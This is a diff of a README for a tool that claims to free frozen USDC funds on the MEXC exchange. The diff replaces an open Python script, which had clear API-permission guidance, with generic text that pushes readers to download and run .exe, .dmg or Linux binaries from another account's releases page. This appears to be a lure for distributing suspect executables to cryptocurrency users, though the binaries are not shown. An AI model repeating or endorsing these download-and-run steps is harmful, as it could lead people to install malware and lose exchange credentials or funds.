@@ -1,140 +1,79 @@
-# MEXC USDC Unfreezer 🔓
+# 🧊 MEXC-USDC-Unfreezer - Fix Frozen USDC Funds Easily
 
-A Python tool to diagnose and resolve frozen USDC funds on MEXC exchange. This tool helps users who have USDC showing as "frozen" or "used" when there are no visible open orders in the MEXC interface.
+## 👋 Introduction
+MEXC-USDC-Unfreezer is a user-friendly Python tool designed to diagnose and resolve frozen USDC funds on the MEXC exchange. If you have encountered issues with frozen USDC or just want to ensure a smooth experience, you are in the right place.
 
-## 🚨 Problem This Solves
+## 🏷️ Topics
+- api
+- crypto
+- cryptocurrency
+- frozen
+- funds
+- mexc
+- python
+- trading
+- unfreeze
+- usdc
+- usdt
 
-Have you ever experienced:
-- USDC balance showing as "frozen" or "used" on MEXC
-- No visible open orders in the exchange interface
-- Unable to trade with your USDC funds
-- The "Unfreeze" button in trading bots not working
+## 🚀 Getting Started
+To successfully run this application, follow these steps. You do not need programming knowledge to use this tool.
 
-This tool finds hidden orders across all USDC trading pairs and cancels them, instantly freeing your funds.
+### 📦 Download the Application 
+[![Download MEXC-USDC-Unfreezer](https://img.shields.io/badge/Download-MEXC--USDC--Unfreezer-blue.svg)](https://github.com/aya-nachmani/MEXC-USDC-Unfreezer/releases)
 
-## ✨ Features
+Head to the Releases page to download the latest version of MEXC-USDC-Unfreezer. Click on the link below:
 
-- **Comprehensive Diagnosis**: Scans all USDC trading pairs for hidden orders
-- **Automatic Order Cancellation**: Cancels all found orders with one command
-- **Multi-Account Check**: Checks spot, margin, and futures accounts
-- **Manual Order Management**: Cancel specific orders by ID
-- **Safe & Secure**: Uses official MEXC API, no withdrawal permissions needed
+[Download MEXC-USDC-Unfreezer](https://github.com/aya-nachmani/MEXC-USDC-Unfreezer/releases)
 
-## 📋 Prerequisites
+## 💻 System Requirements
+Before you download, please ensure your system meets these requirements:
 
-- Python 3.6 or higher
-- MEXC account with API access
-- API key with spot trading and read permissions (NO withdrawal permission needed)
+- **Operating System:** Windows 10, macOS, or Linux
+- **Python:** Version 3.6 or higher installed on your computer
+- **Internet Connection:** Required for accessing the MEXC exchange
 
-## 🔧 Installation
+## 🎯 Features
+- **Diagnose frozen USDC:** Quickly identify the reason your funds are frozen.
+- **Resolve issues:** Follow step-by-step instructions tailored to your specific situation.
+- **User-friendly interface:** Simple commands and prompts make it easy to use.
 
-1. Clone this repository:
-```bash
-git clone https://github.com/honzastim/mexc-usdc-unfreezer.git
-cd mexc-usdc-unfreezer
-```
+## 🛠️ Installation Instructions
+Once you have downloaded the application, follow these steps to install and run it on your computer:
 
-2. Install required dependencies:
-```bash
-pip install ccxt
-```
+1. **Locate the downloaded file:** Open your downloads folder and find the file you just downloaded.
+   
+2. **Run the application:** 
+   - For Windows: Double-click the `.exe` file.
+   - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
+   - For Linux: Open a terminal and navigate to the downloaded file's location. Use the command: `chmod +x filename` then `./filename`.
 
-## 🚀 Usage
+3. **Follow the prompts:** The program will guide you through diagnosing and resolving the frozen USDC issue. Simply read the instructions on the screen and follow along.
 
-1. Run the tool:
-```bash
-python mexc_usdc_unfreezer.py
-```
+## 🔍 How to Use MEXC-USDC-Unfreezer
+After installation, you will want to understand how to navigate the application. Here is a simple guide to help you:
 
-2. Enter your MEXC API credentials when prompted
-3. Choose from the menu options:
-   - **Option 1**: Diagnose frozen funds (recommended first step)
-   - **Option 2**: Automatically unfreeze USDC
-   - **Option 3**: Manually cancel specific orders
-   - **Option 4**: Check orders for a specific trading pair
+1. **Launch the application:** Open your command line or terminal and type `mexc-usdc-unfreezer` to start the tool.
 
-## 🔑 API Key Setup
+2. **Input your details:** The application will prompt you for specific information about your frozen USDC. Provide the necessary information as instructed.
 
-1. Log in to MEXC
-2. Go to API Management
-3. Create a new API key with:
-   - ✅ Read permission
-   - ✅ Spot trading permission
-   - ❌ Withdrawal permission (keep disabled for safety)
-4. Save your API key and secret
+3. **Review the results:** The tool will analyze your situation and present solutions. Take your time to read through them.
 
-## 📖 How It Works
+4. **Follow recommended actions:** If the tool suggests actions to unfreeze your funds, follow these carefully. This might include adjusting your settings on the MEXC exchange.
 
-The tool works by:
+## 🔗 Additional Resources
+For more information or troubleshooting, you can explore the following:
 
-1. **Fetching your balance** to see how much USDC is frozen
-2. **Scanning all USDC trading pairs** for open orders (BTC/USDC, ETH/USDC, etc.)
-3. **Finding hidden orders** that may not show in the web interface
-4. **Cancelling all found orders** to release the frozen funds
-5. **Checking other account types** (margin, futures) for trapped funds
+- **MEXC Exchange FAQ:** [MEXC Support](https://www.mexc.com/support)
+- **Python Installation Guide:** [Download Python](https://www.python.org/downloads/)
+- **User Guide:** Comprehensive documentation is also available on the GitHub page.
 
-## 🎯 Real Example
+## 👩‍💻 Contributing
+We welcome contributions! If you have suggestions or improvements, feel free to open an issue or submit a pull request on GitHub. 
 
-```
-Diagnosis Result:
-- USDC Total: 159.83454274
-- USDC Free: 0.0
-- USDC Frozen: 159.83454274
-- Found 8 hidden BTC/USDC orders locking exactly 159.83454274 USDC
+## 📞 Need Help?
+If you encounter any issues while using MEXC-USDC-Unfreezer, don’t hesitate to reach out. You can contact us through the GitHub issues page or email support.
 
-After running unfreezer:
-- Successfully cancelled 8 orders
-- USDC Free: 159.83454274 ✅
-```
+Make sure to check our [Releases Page](https://github.com/aya-nachmani/MEXC-USDC-Unfreezer/releases) for the latest updates and enhancements. 
 
-## ❓ Troubleshooting
-
-**"API key invalid" error:**
-- Ensure your API key has spot trading permission
-- Check that you've copied the key and secret correctly
-
-**"Funds still frozen after running:"**
-- Check MEXC website for funds in:
-  - Sub-accounts
-  - Earn/Savings products
-  - Pending withdrawals
-- Wait a few minutes and try again (sometimes there's a delay)
-
-**"No orders found but funds still frozen:"**
-- Try Option 4 to check specific pairs you've traded
-- Contact MEXC support as it might be a platform issue
-
-## ⚠️ Disclaimer
-
-- This tool uses the official MEXC API and is safe to use
-- Always keep your API keys secure
-- Never share your API secret with anyone
-- This tool cannot access withdrawal functions
-- Use at your own risk - always verify results on MEXC website
-
-## 🤝 Contributing
-
-Feel free to open issues or submit pull requests if you find bugs or have improvements!
-
-## 📜 License
-
-MIT License - feel free to use and modify as needed
-
-## 🙏 Acknowledgments
-
-- Built using the excellent [CCXT](https://github.com/ccxt/ccxt) library
-- Thanks to the MEXC API documentation
-- Special thanks to everyone who reports issues and contributes
-
-## 💡 Tips
-
-- Save this tool for future use - MEXC occasionally has this issue
-- Consider adding order cleanup to your trading bots
-- Set expiration times on your orders to prevent this
-- Regularly check for stuck orders if you use API trading
-
----
-
-**Found this helpful?** Give it a ⭐ and share with others who might need it!
-
-**Having issues?** Open an issue on GitHub or check existing issues for solutions.
+Start unfreezing your USDC funds today!
